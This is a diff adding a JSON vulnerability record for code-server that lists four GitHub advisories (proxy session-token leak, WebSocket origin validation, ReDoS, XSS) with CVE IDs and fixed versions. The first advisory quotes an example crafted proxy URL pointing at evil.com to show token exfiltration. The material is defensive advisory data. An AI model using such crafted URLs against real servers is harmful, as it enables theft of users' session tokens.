@@ -1,0 +1,90 @@
+{
+  "name": "code-server",
+  "lastUpdated": "2026-01-31T15:05:26.294Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-p483-wpfp-42cj",
+      "title": "code-server's session cookie can be extracted by having user visit specially crafted proxy URL",
+      "description": "### Summary\n\nA maliciously crafted URL using the `proxy` subpath can result in the attacker gaining access to the session token.\n\n### Details\n\nFailure to properly validate the port for a `proxy` request can result in proxying to an arbitrary domain. The malicious URL `https://<code-server>/proxy/test@evil.com/path` would be proxied to `test@evil.com/path` where the attacker could exfiltrate a user's session token.\n\n### Impact\n\nAny user who runs code-server with the built-in proxy enabled and cli",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-p483-wpfp-42cj",
+      "publishedAt": "2025-05-09T19:34:35Z",
+      "modifiedAt": "2025-05-09T21:39:17Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-p483-wpfp-42cj"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2025-47269"
+        }
+      ],
+      "affectedRange": "< 4.99.4",
+      "fixedVersion": "4.99.4"
+    },
+    {
+      "id": "GHSA-frjg-g767-7363",
+      "title": "code-server vulnerable to Missing Origin Validation in WebSockets",
+      "description": "Versions of the package code-server before 4.10.1 are vulnerable to Missing Origin Validation in WebSockets handshakes. Exploiting this vulnerability can allow an adversary in specific scenarios to access data from and connect to the code-server instance.",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-frjg-g767-7363",
+      "publishedAt": "2023-03-23T06:30:15Z",
+      "modifiedAt": "2023-03-27T22:32:10Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-frjg-g767-7363"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2023-26114"
+        }
+      ],
+      "affectedRange": "< 4.10.1",
+      "fixedVersion": "4.10.1"
+    },
+    {
+      "id": "GHSA-49x3-8228-3w3m",
+      "title": "Inefficient Regular Expression Complexity in code-server",
+      "description": "code-server is vulnerable to Inefficient Regular Expression Complexity",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-49x3-8228-3w3m",
+      "publishedAt": "2021-09-20T20:18:39Z",
+      "modifiedAt": "2023-02-01T05:06:06Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-49x3-8228-3w3m"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2021-3810"
+        }
+      ],
+      "affectedRange": "< 3.12.0",
+      "fixedVersion": "3.12.0"
+    },
+    {
+      "id": "GHSA-2gp3-6c9p-jp7w",
+      "title": "Cross site scripting in code-server",
+      "description": "Cross-site scripting (XSS) vulnerability exists in Coder Code-Server before 3.12.0, allows attackers to execute arbitrary code via crafted URL.",
+      "severity": "medium",
+      "url": "https://github.com/advisories/GHSA-2gp3-6c9p-jp7w",
+      "publishedAt": "2022-05-12T00:00:40Z",
+      "modifiedAt": "2023-02-01T05:02:14Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-2gp3-6c9p-jp7w"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2021-42648"
+        }
+      ],
+      "affectedRange": "< 3.12.0",
+      "fixedVersion": "3.12.0"
+    }
+  ]
+}
